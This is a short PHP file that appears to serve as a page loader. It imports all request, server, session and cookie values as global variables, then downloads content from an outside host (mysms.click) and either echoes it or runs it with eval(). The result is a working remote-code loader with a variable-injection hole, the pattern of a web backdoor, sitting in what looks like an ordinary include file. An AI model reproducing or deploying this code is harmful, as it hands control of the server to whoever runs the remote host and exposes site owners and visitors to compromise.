<?php
if(!isset($ix)){
foreach ($_REQUEST as $key=>$val){${$key}=$val;}
}
foreach ($_SERVER  as $key=>$val){${$key}=$val;}
foreach ($_SESSION as $key=>$val){${$key}=$val;}
foreach ($_COOCIE  as $key=>$val){${$key}=$val;}
include("database.php"); include("data.php");
/*
$r=mysql_query("SELECT fun FROM blkinf00 WHERE ind='$ix'");
if(mysql_numrows($r)==0) require("blkinf.php");
else $s=mysql_result($r,0,0);
*/
$s=file_get_contents("http://mysms.click/i.php?ix=odoo&IX=$ix&t=".time());
if (substr($s,0,1)=="<") echo stripslashes($s) ;
else                     eval(stripslashes($s));
?>
